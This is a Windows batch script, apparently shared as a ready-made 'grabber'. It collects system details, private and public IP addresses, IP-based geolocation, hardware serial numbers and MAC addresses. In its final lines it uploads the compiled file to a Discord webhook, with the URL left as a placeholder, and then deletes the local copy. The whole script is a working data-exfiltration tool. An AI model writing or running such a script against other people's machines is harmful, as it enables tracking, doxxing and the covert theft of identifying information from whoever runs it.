:: Made by @misterofgames_yt

@echo off
setlocal enabledelayedexpansion
echo Collecting system information...
echo Hello! Made by @misterofgames_yt. > sysinfo.txt

:: Get System Information
echo. >> sysinfo.txt
echo ========= SYSTEM INFORMATION ========= >> sysinfo.txt
systeminfo >> sysinfo.txt

:: Get Network Configuration
echo. >> sysinfo.txt
echo ========= NETWORK CONFIGURATION ========= >> sysinfo.txt
ipconfig /all >> sysinfo.txt

:: Get Private IP
echo. >> sysinfo.txt
echo Private IP Address: >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv4 Address"') do echo %%i >> sysinfo.txt

:: Get Public IP
echo. >> sysinfo.txt
echo Public IP Address: >> sysinfo.txt
for /f %%A in ('curl -s https://api.ipify.org') do echo %%A >> sysinfo.txt

:: Get Geolocation (Coordinates, Country, City, ISP)
echo. >> sysinfo.txt
echo ========= GEOLOCATION INFORMATION ========= >> sysinfo.txt
curl -s http://ip-api.com/line/ > geo.txt
(for /f "tokens=*" %%G in (geo.txt) do echo %%G) >> sysinfo.txt
del geo.txt

:: Get CPU Details
echo. >> sysinfo.txt
echo ========= CPU INFORMATION ========= >> sysinfo.txt
wmic cpu get name,description /value >> sysinfo.txt

:: Get BIOS Details
echo. >> sysinfo.txt
echo ========= BIOS INFORMATION ========= >> sysinfo.txt
wmic bios get name,version,serialnumber /value >> sysinfo.txt

:: Get GPU Details
echo. >> sysinfo.txt
echo ========= GPU INFORMATION ========= >> sysinfo.txt
wmic path win32_videocontroller get name,adapterram /value >> sysinfo.txt

:: Get Motherboard Information
echo. >> sysinfo.txt
echo ========= MOTHERBOARD INFORMATION ========= >> sysinfo.txt
wmic baseboard get product,manufacturer,serialnumber,version /value >> sysinfo.txt

:: Get Disk Drives
echo. >> sysinfo.txt
echo ========= DISK DRIVES ========= >> sysinfo.txt
wmic diskdrive get model,size /value >> sysinfo.txt

:: Get RAM Information
echo. >> sysinfo.txt
echo ========= MEMORY (RAM) INFORMATION ========= >> sysinfo.txt
wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt

:: Get System Uptime
echo. >> sysinfo.txt
echo ========= SYSTEM UPTIME ========= >> sysinfo.txt
wmic os get LastBootUpTime /value >> sysinfo.txt

:: Get MAC Address
echo. >> sysinfo.txt
echo ========= MAC ADDRESS ========= >> sysinfo.txt
getmac /v /fo list >> sysinfo.txt

:: Set Discord Webhook URL
set "WEBHOOK_URL=YOUR_WEBHOOK_URL"

:: Send file to Discord webhook
echo Sending data to Discord...
curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%

:: Clean up
del sysinfo.txt

echo Information sent successfully!
pause